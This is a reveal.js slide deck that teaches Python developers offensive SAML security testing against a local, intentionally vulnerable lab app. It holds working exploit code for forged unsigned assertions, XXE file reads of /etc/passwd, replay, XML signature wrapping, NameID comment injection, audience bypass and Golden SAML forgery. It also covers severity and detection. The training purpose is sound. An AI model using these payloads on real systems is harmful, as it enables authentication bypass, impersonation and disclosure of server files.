<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>SAML Security Testing for Python Developers - Verifhai Training</title>
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/reveal.js@5.1.0/dist/reveal.css">
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/reveal.js@5.1.0/dist/theme/black.css">
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/reveal.js@5.1.0/plugin/highlight/monokai.css">
<style>
:root { --r-heading-color: #f0883e; --r-link-color: #f0883e; }
.reveal { font-size: 28px; }
.reveal h1, .reveal h2, .reveal h3 { text-transform: none; }
.reveal h1 { font-size: 2em; }
.reveal h2 { font-size: 1.5em; color: #f0883e; }
.reveal h3 { font-size: 1.2em; color: #d29922; }
.reveal pre { width: 100%; font-size: 0.55em; }
.reveal pre code { max-height: 500px; padding: 15px; }
.reveal .small-code pre { font-size: 0.48em; }
.exploit { color: #f85149; font-weight: bold; }
.secure { color: #3fb950; font-weight: bold; }
.warn { color: #d29922; font-weight: bold; }
.recon { color: #58a6ff; font-weight: bold; }
.highlight-box { background: rgba(240,136,62,0.15); border-left: 4px solid #f0883e; padding: 15px 20px; margin: 15px 0; text-align: left; border-radius: 4px; }
.danger-box { background: rgba(248,81,73,0.15); border-left: 4px solid #f85149; padding: 15px 20px; margin: 15px 0; text-align: left; border-radius: 4px; }
.success-box { background: rgba(63,185,80,0.15); border-left: 4px solid #3fb950; padding: 15px 20px; margin: 15px 0; text-align: left; border-radius: 4px; }
.auth-box { background: rgba(210,153,34,0.15); border-left: 4px solid #d29922; padding: 15px 20px; margin: 15px 0; text-align: left; border-radius: 4px; }
table { margin: 0 auto; border-collapse: collapse; font-size: 0.8em; }
th, td { border: 1px solid #444; padding: 8px 14px; text-align: left; }
th { background: rgba(240,136,62,0.2); color: #f0883e; }
.episode-card { background: linear-gradient(135deg, #1a0e00, #0d1117); border: 1px solid #30363d; border-radius: 12px; padding: 40px; }
.badge { display: inline-block; padding: 3px 10px; border-radius: 12px; font-size: 0.7em; margin: 0 4px; }
.badge-l1 { background: #238636; }
.badge-l2 { background: #9e6a03; }
.badge-l3 { background: #da3633; }
</style>
</head>
<body>
<div class="reveal">
<div class="slides">

<!-- ============================================================ -->
<!-- TITLE SLIDE -->
<!-- ============================================================ -->
<section>
<h1>SAML Security Testing</h1>
<h3>Penetration Testing for Python Developers</h3>
<p style="margin-top:40px;color:#8b949e;">10 Episodes &bull; 105 Minutes &bull; L1-L3</p>
<p style="color:#f0883e;">Verifhai &bull; HAIAMM Education &amp; Guidance</p>
<div class="auth-box" style="font-size:0.7em;margin-top:20px;">
All exercises target intentionally vulnerable applications.<br>
Never use these techniques without explicit written authorization.
</div>
<aside class="notes">Welcome to the SAML Security Testing series. This offensive companion to the SAML defensive lab teaches you to find and exploit SAML vulnerabilities during authorized assessments.</aside>
</section>

<!-- ============================================================ -->
<!-- SERIES OVERVIEW -->
<!-- ============================================================ -->
<section>
<h2>Series Overview</h2>
<table>
<tr><th>Episode</th><th>Topic</th><th>Level</th></tr>
<tr><td>E01</td><td>SAML Response Reconnaissance</td><td><span class="badge badge-l1">L1</span></td></tr>
<tr><td>E02</td><td>Forging Unsigned SAML Assertions</td><td><span class="badge badge-l1">L1</span></td></tr>
<tr><td>E03</td><td>XXE Injection Through SAML</td><td><span class="badge badge-l1">L1</span></td></tr>
<tr><td>E04</td><td>SAML Replay Attacks</td><td><span class="badge badge-l1">L1</span></td></tr>
<tr><td>E05</td><td>XML Signature Wrapping (XSW)</td><td><span class="badge badge-l2">L2</span></td></tr>
<tr><td>E06</td><td>NameID Comment Injection &amp; Audience Bypass</td><td><span class="badge badge-l2">L2</span></td></tr>
<tr><td>E07</td><td>Session Attacks &amp; Chaining</td><td><span class="badge badge-l2">L2</span></td></tr>
<tr><td>E08</td><td>Golden SAML Attack Simulation</td><td><span class="badge badge-l3">L3</span></td></tr>
<tr><td>E09</td><td>Building a SAML Testing Toolkit</td><td><span class="badge badge-l3">L3</span></td></tr>
<tr><td>E10</td><td>Professional Reporting &amp; Detection</td><td><span class="badge badge-l3">L3</span></td></tr>
</table>
</section>

<!-- ============================================================ -->
<!-- E01: SAML RECONNAISSANCE -->
<!-- ============================================================ -->
<section>
<section>
<div class="episode-card">
<h2>Episode 01</h2>
<h1>SAML Response Reconnaissance</h1>
<p><span class="badge badge-l1">Level 1</span> &bull; 9 minutes</p>
</div>
</section>

<section>
<h2>Intercepting SAML Responses</h2>
<div class="highlight-box">SAML responses are Base64-encoded XML in a POST parameter — decode to reveal the full structure.</div>
<pre><code class="python">import base64, requests
from lxml import etree

# Get a test SAML response from the vulnerable app
resp = requests.get("http://127.0.0.1:5001/generate?username=alice@example.com")
saml_b64 = resp.json()["SAMLResponse"]

# Decode and pretty-print the XML
xml_bytes = base64.b64decode(saml_b64)
root = etree.fromstring(xml_bytes)
print(etree.tostring(root, pretty_print=True).decode())</code></pre>
<aside class="notes">Step one: intercept and decode. The SAML response is just Base64-encoded XML carried through the browser. Anyone can read it.</aside>
</section>

<section>
<h2>Attack Surface Mapping</h2>
<table>
<tr><th>Element</th><th>Attack Vector</th></tr>
<tr><td><code>NameID</code></td><td>Identity forgery, comment injection</td></tr>
<tr><td><code>Signature</code></td><td>Missing validation, XSW bypass</td></tr>
<tr><td><code>Conditions</code></td><td>Audience bypass, replay window</td></tr>
<tr><td><code>Destination</code></td><td>Cross-application replay</td></tr>
<tr><td><code>XML structure</code></td><td>XXE injection, entity expansion</td></tr>
<tr><td><code>Response ID</code></td><td>Replay if not tracked</td></tr>
</table>
<aside class="notes">Every element in a SAML response is a potential attack vector. Map them all before choosing your first exploit.</aside>
</section>
</section>

<!-- ============================================================ -->
<!-- E02: FORGING UNSIGNED ASSERTIONS -->
<!-- ============================================================ -->
<section>
<section>
<div class="episode-card">
<h2>Episode 02</h2>
<h1>Forging Unsigned SAML Assertions</h1>
<p><span class="badge badge-l1">Level 1</span> &bull; 9 minutes</p>
</div>
</section>

<section>
<h2>Building a SAML Response from Scratch</h2>
<div class="small-code">
<pre><code class="python">from lxml import etree
import base64, datetime

SAML_NS = "urn:oasis:names:tc:SAML:2.0:assertion"
SAMLP_NS = "urn:oasis:names:tc:SAML:2.0:protocol"

response = etree.Element(f"{{{SAMLP_NS}}}Response", nsmap={
    "samlp": SAMLP_NS, "saml": SAML_NS})
assertion = etree.SubElement(response, f"{{{SAML_NS}}}Assertion")
subject = etree.SubElement(assertion, f"{{{SAML_NS}}}Subject")
nameid = etree.SubElement(subject, f"{{{SAML_NS}}}NameID")
nameid.text = "admin@example.com"  # We choose the identity

xml_str = etree.tostring(response, xml_declaration=True, encoding="UTF-8")
saml_b64 = base64.b64encode(xml_str).decode()</code></pre>
</div>
<aside class="notes">We build a complete SAML response using lxml — no IdP involved, no signature. We set the NameID to whatever identity we want.</aside>
</section>

<section>
<h2>Submitting the Forged Assertion</h2>
<pre><code class="python">import requests

resp = requests.post("http://127.0.0.1:5001/saml/acs-nosig",
    data={"SAMLResponse": saml_b64})

print(resp.json())
# {"message": "Authentication successful",
#  "user": "admin@example.com",
#  "role": "admin"}</code></pre>
<div class="success-box"><span class="exploit">RESULT:</span> Authenticated as admin — no signature, no secret, no IdP</div>
<aside class="notes">The SP accepted our completely unsigned assertion. We're authenticated as admin without ever touching the Identity Provider.</aside>
</section>
</section>

<!-- ============================================================ -->
<!-- E03: XXE INJECTION -->
<!-- ============================================================ -->
<section>
<section>
<div class="episode-card">
<h2>Episode 03</h2>
<h1>XXE Injection Through SAML</h1>
<p><span class="badge badge-l1">Level 1</span> &bull; 8 minutes</p>
</div>
</section>

<section>
<h2>The XXE Payload</h2>
<pre><code class="xml">&lt;?xml version="1.0"?&gt;
&lt;!DOCTYPE foo [
  &lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;
]&gt;
&lt;samlp:Response xmlns:samlp="..."&gt;
  &lt;saml:Assertion&gt;
    &lt;saml:Subject&gt;
      &lt;saml:NameID&gt;&amp;xxe;&lt;/saml:NameID&gt;
    &lt;/saml:Subject&gt;
  &lt;/saml:Assertion&gt;
&lt;/samlp:Response&gt;</code></pre>
<div class="danger-box">The XML parser resolves <code>&amp;xxe;</code> to the contents of <code>/etc/passwd</code></div>
<aside class="notes">We inject a DOCTYPE declaration with an external entity that points to a local file. When the parser processes the NameID element, it resolves the entity and includes the file contents.</aside>
</section>

<section>
<h2>Python XXE Exploit</h2>
<pre><code class="python">import base64, requests

xxe_xml = '''&lt;?xml version="1.0"?&gt;
&lt;!DOCTYPE foo [&lt;!ENTITY xxe SYSTEM "file:///etc/hostname"&gt;]&gt;
&lt;samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol"
                xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion"&gt;
  &lt;saml:Assertion&gt;
    &lt;saml:Subject&gt;
      &lt;saml:NameID&gt;&amp;xxe;&lt;/saml:NameID&gt;
    &lt;/saml:Subject&gt;
  &lt;/saml:Assertion&gt;
&lt;/samlp:Response&gt;'''

saml_b64 = base64.b64encode(xxe_xml.encode()).decode()
resp = requests.post("http://127.0.0.1:5001/saml/acs-xxe",
    data={"SAMLResponse": saml_b64})
print(resp.json()["user"])  # Server's hostname!</code></pre>
<aside class="notes">The response contains the server's hostname in the user field — proof that the XXE was resolved. In a real attack, you'd read config files, credentials, or use SSRF to reach internal services.</aside>
</section>
</section>

<!-- ============================================================ -->
<!-- E04: REPLAY ATTACKS -->
<!-- ============================================================ -->
<section>
<section>
<div class="episode-card">
<h2>Episode 04</h2>
<h1>SAML Replay Attacks</h1>
<p><span class="badge badge-l1">Level 1</span> &bull; 8 minutes</p>
</div>
</section>

<section>
<h2>Capture and Replay</h2>
<pre><code class="python"># Step 1: Get a legitimate SAML response
resp = requests.get("http://127.0.0.1:5001/generate?username=alice@example.com")
saml_b64 = resp.json()["SAMLResponse"]

# Step 2: Submit it — works
r1 = requests.post("http://127.0.0.1:5001/saml/acs-replay",
    data={"SAMLResponse": saml_b64})
print(r1.json()["response_id"])  # _resp_abc123

# Step 3: Submit the SAME response again — still works!
r2 = requests.post("http://127.0.0.1:5001/saml/acs-replay",
    data={"SAMLResponse": saml_b64})
print(r2.json()["message"])  # "Authentication successful"</code></pre>
<div class="danger-box">No Response ID tracking = unlimited replays</div>
<aside class="notes">The same SAML response accepted twice. Without tracking Response IDs, the SP has no way to detect replay attacks.</aside>
</section>
</section>

<!-- ============================================================ -->
<!-- E05: XML SIGNATURE WRAPPING -->
<!-- ============================================================ -->
<section>
<section>
<div class="episode-card">
<h2>Episode 05</h2>
<h1>XML Signature Wrapping (XSW)</h1>
<p><span class="badge badge-l2">Level 2</span> &bull; 14 minutes</p>
</div>
</section>

<section>
<h2>The Core Flaw</h2>
<div class="highlight-box">
<strong>Signature validates:</strong> the <em>signed</em> assertion<br>
<strong>Application reads:</strong> the <em>first</em> assertion in the tree<br>
<strong>XSW attack:</strong> make these two different elements
</div>
<pre><code class="plaintext">BEFORE XSW:
Response
  └── Assertion [signed] ← app reads AND signature covers

AFTER XSW (Type 1):
Response
  ├── Assertion [FORGED] ← app reads this (first in tree)
  └── Wrapper
      └── Assertion [signed] ← signature covers this</code></pre>
<aside class="notes">The fundamental XSW flaw: the signature is valid because it covers the original assertion. But the application reads the forged assertion because it appears first in the XML tree.</aside>
</section>

<section>
<h2>Building an XSW Attack</h2>
<div class="small-code">
<pre><code class="python">from lxml import etree

# Parse a valid, signed SAML response
root = etree.fromstring(valid_signed_response)
signed_assertion = root.find(f".//{{{SAML_NS}}}Assertion")

# Create a wrapper for the signed assertion
wrapper = etree.SubElement(root, "Wrapper")
wrapper.append(signed_assertion)  # Move signed assertion into wrapper

# Insert forged assertion FIRST
forged = build_forged_assertion("admin@evil.com", role="admin")
root.insert(0, forged)  # First child = what the app reads

# Submit — signature validates (signed assertion intact),
# but app reads forged assertion (first in tree)</code></pre>
</div>
<aside class="notes">We move the legitimately signed assertion into a wrapper element and insert our forged assertion at position zero. The signature still validates, but the app extracts claims from our forged one.</aside>
</section>
</section>

<!-- ============================================================ -->
<!-- E06: COMMENT INJECTION & AUDIENCE BYPASS -->
<!-- ============================================================ -->
<section>
<section>
<div class="episode-card">
<h2>Episode 06</h2>
<h1>NameID Comment Injection &amp; Audience Bypass</h1>
<p><span class="badge badge-l2">Level 2</span> &bull; 11 minutes</p>
</div>
</section>

<section>
<h2>Comment Injection</h2>
<pre><code class="xml">&lt;saml:NameID&gt;attacker@evil.com&lt;!-- --&gt;.legit.com&lt;/saml:NameID&gt;</code></pre>
<table>
<tr><th>Method</th><th>Returns</th><th>Vulnerable?</th></tr>
<tr><td><code>.text</code></td><td><code>attacker@evil.com</code></td><td class="exploit">Yes</td></tr>
<tr><td><code>itertext()</code></td><td><code>attacker@evil.com.legit.com</code></td><td class="secure">No</td></tr>
</table>
<div class="danger-box"><code>.text</code> truncates at the XML comment — only returns text before the first child node</div>
<aside class="notes">The XML comment splits the text content. The .text property only returns text before the comment, so the application sees attacker@evil.com instead of the full address.</aside>
</section>

<section>
<h2>Audience/Destination Bypass</h2>
<pre><code class="python"># Assertion meant for App-A, submitted to App-B
forged = build_saml_response(
    nameid="admin@example.com",
    audience="https://app-a.example.com",
    destination="https://app-a.example.com/acs")

# App-B with strict:False doesn't check these fields
resp = requests.post("http://127.0.0.1:5001/saml/acs-nostrict",
    data={"SAMLResponse": base64.b64encode(forged).decode()})

print(resp.json()["audience_received"])
# "https://app-a.example.com" — accepted anyway!</code></pre>
<aside class="notes">Without strict validation, assertions meant for other applications are accepted. This enables cross-application authentication bypass.</aside>
</section>
</section>

<!-- ============================================================ -->
<!-- E07: SESSION ATTACKS & CHAINING -->
<!-- ============================================================ -->
<section>
<section>
<div class="episode-card">
<h2>Episode 07</h2>
<h1>Session Attacks &amp; Vulnerability Chaining</h1>
<p><span class="badge badge-l2">Level 2</span> &bull; 10 minutes</p>
</div>
</section>

<section>
<h2>Session Fixation + SAML</h2>
<div class="highlight-box">
<strong>Step 1:</strong> Attacker sets victim's session cookie<br>
<strong>Step 2:</strong> Victim authenticates via SAML<br>
<strong>Step 3:</strong> Session ID NOT regenerated<br>
<strong>Step 4:</strong> Attacker's cookie now points to authenticated session
</div>
<aside class="notes">If the SP doesn't regenerate the session ID after SAML authentication, a pre-set session cookie gives the attacker access to the victim's authenticated session.</aside>
</section>

<section>
<h2>Attack Chains</h2>
<table>
<tr><th>Chain</th><th>Steps</th><th>Impact</th></tr>
<tr><td class="exploit">XXE → Golden SAML</td><td>Read IdP config → find key → forge assertions</td><td>Persistent compromise</td></tr>
<tr><td class="exploit">XSW + Comment</td><td>Bypass signature + spoof identity</td><td>Any user access</td></tr>
<tr><td class="warn">Replay + Audience</td><td>Replay assertion to different app</td><td>Cross-app access</td></tr>
</table>
<aside class="notes">Real attacks chain vulnerabilities. The XXE to Golden SAML chain is the most devastating — it gives persistent access to any federated application.</aside>
</section>
</section>

<!-- ============================================================ -->
<!-- E08: GOLDEN SAML -->
<!-- ============================================================ -->
<section>
<section>
<div class="episode-card">
<h2>Episode 08</h2>
<h1>Golden SAML Attack Simulation</h1>
<p><span class="badge badge-l3">Level 3</span> &bull; 13 minutes</p>
</div>
</section>

<section>
<h2>What is Golden SAML?</h2>
<div class="danger-box">
<strong>Compromised IdP signing key</strong> = forge assertions for ANY user to ANY federated application.<br><br>
Password resets don't help. MFA changes don't help. Account lockouts don't help.<br>
The attacker never touches the IdP.
</div>
<aside class="notes">Golden SAML is the SAML equivalent of a Golden Ticket in Kerberos. With the signing key, the attacker is the IdP.</aside>
</section>

<section>
<h2>Forging with a Stolen Key</h2>
<div class="small-code">
<pre><code class="python">import requests
from cryptography.hazmat.primitives import serialization

# Step 1: Obtain IdP signing key (simulated — exposed for training)
meta = requests.get("http://127.0.0.1:5001/idp-metadata").json()
idp_private_pem = meta["idp_private_key_pem"]

# Step 2: Build a SAML assertion for any user
assertion_xml = build_assertion(
    nameid="ceo@company.com", role="super-admin")

# Step 3: Sign with the stolen key
signed_xml = sign_assertion(assertion_xml, idp_private_pem)

# Step 4: Submit — SP accepts any valid signature
resp = requests.post("http://127.0.0.1:5001/saml/acs-golden",
    data={"SAMLResponse": base64.b64encode(signed_xml).decode()})
print(resp.json()["user"])  # "ceo@company.com"</code></pre>
</div>
<aside class="notes">We obtained the IdP private key, forged an assertion for the CEO with super-admin role, signed it, and submitted it directly to the SP. No IdP involved.</aside>
</section>

<section>
<h2>Only One Fix</h2>
<div class="success-box">
<strong>Rotate the IdP certificate</strong> and update ALL SP trust relationships.<br><br>
Until the key is rotated, the attacker can forge assertions indefinitely.
</div>
<aside class="notes">The only effective remediation is rotating the signing certificate and updating every SP. Everything else — password resets, MFA, account locks — is ineffective because the attacker bypasses the IdP entirely.</aside>
</section>
</section>

<!-- ============================================================ -->
<!-- E09: SAML TESTING TOOLKIT -->
<!-- ============================================================ -->
<section>
<section>
<div class="episode-card">
<h2>Episode 09</h2>
<h1>Building a SAML Testing Toolkit</h1>
<p><span class="badge badge-l3">Level 3</span> &bull; 12 minutes</p>
</div>
</section>

<section>
<h2>Toolkit Architecture</h2>
<div class="highlight-box">
<strong>Decoder</strong> → <strong>Attack Modules</strong> → <strong>Reporter</strong>
</div>
<table>
<tr><th>Module</th><th>Tests</th></tr>
<tr><td><code>sig_bypass</code></td><td>Unsigned assertions</td></tr>
<tr><td><code>xxe_test</code></td><td>File read, SSRF, entity expansion</td></tr>
<tr><td><code>xsw_test</code></td><td>All 8 XSW variants</td></tr>
<tr><td><code>replay_test</code></td><td>Response ID tracking</td></tr>
<tr><td><code>comment_inject</code></td><td>NameID comment truncation</td></tr>
<tr><td><code>audience_bypass</code></td><td>Cross-app assertion replay</td></tr>
</table>
<aside class="notes">A modular toolkit lets you test all SAML vulnerability classes with a single scan command.</aside>
</section>
</section>

<!-- ============================================================ -->
<!-- E10: REPORTING & DETECTION -->
<!-- ============================================================ -->
<section>
<section>
<div class="episode-card">
<h2>Episode 10</h2>
<h1>Professional Reporting &amp; Detection</h1>
<p><span class="badge badge-l3">Level 3</span> &bull; 11 minutes</p>
</div>
</section>

<section>
<h2>SAML Finding Severity Reference</h2>
<table>
<tr><th>Finding</th><th>CVSS</th><th>Severity</th></tr>
<tr><td>Missing signature validation</td><td>9.8</td><td class="exploit">Critical</td></tr>
<tr><td>XXE injection</td><td>8.6</td><td class="exploit">High</td></tr>
<tr><td>XSW bypass</td><td>9.1</td><td class="exploit">Critical</td></tr>
<tr><td>Golden SAML</td><td>10.0</td><td class="exploit">Critical</td></tr>
<tr><td>Comment injection</td><td>7.5</td><td class="warn">High</td></tr>
<tr><td>Missing replay protection</td><td>6.5</td><td class="warn">Medium</td></tr>
<tr><td>Open redirect (RelayState)</td><td>4.7</td><td class="warn">Medium</td></tr>
</table>
<aside class="notes">Reference CVSS scores for SAML findings. Golden SAML at 10.0 — it doesn't get more severe than persistent, undetectable authentication bypass.</aside>
</section>

<section>
<h2>Golden SAML Detection</h2>
<div class="highlight-box">
<strong>Key indicator:</strong> SP authentication event with NO corresponding IdP sign-in event
</div>
<table>
<tr><th>SP Log</th><th>IdP Log</th><th>Interpretation</th></tr>
<tr><td class="secure">Auth success</td><td class="secure">Sign-in event</td><td>Normal</td></tr>
<tr><td class="exploit">Auth success</td><td class="exploit">No event</td><td>Golden SAML!</td></tr>
</table>
<aside class="notes">The single strongest indicator: the SP shows a successful SAML authentication, but the IdP has no record of that user signing in. This correlation requires log aggregation in a SIEM.</aside>
</section>

<section>
<h2>Series Complete</h2>
<div class="highlight-box">
<strong>L1:</strong> Reconnaissance, signature bypass, XXE, replay<br>
<strong>L2:</strong> XSW attacks, comment injection, audience bypass, session attacks<br>
<strong>L3:</strong> Golden SAML, testing toolkits, professional reporting
</div>
<p style="margin-top:20px;">
<span class="badge badge-l1">Crawl</span>
<span class="badge badge-l2">Walk</span>
<span class="badge badge-l3">Run</span>
</p>
<div class="auth-box" style="font-size:0.8em;margin-top:20px;">
Always test with authorization. Never use these techniques without explicit written permission.
</div>
<aside class="notes">You now have the skills to conduct a professional SAML security assessment. From forging unsigned assertions to simulating Golden SAML — always with authorization.</aside>
</section>
</section>

</div>
</div>
<script src="https://cdn.jsdelivr.net/npm/reveal.js@5.1.0/dist/reveal.js"></script>
<script src="https://cdn.jsdelivr.net/npm/reveal.js@5.1.0/plugin/highlight/highlight.js"></script>
<script src="https://cdn.jsdelivr.net/npm/reveal.js@5.1.0/plugin/notes/notes.js"></script>
<script>
Reveal.initialize({
  hash: true,
  slideNumber: true,
  plugins: [RevealHighlight, RevealNotes]
});
</script>
</body>
</html>
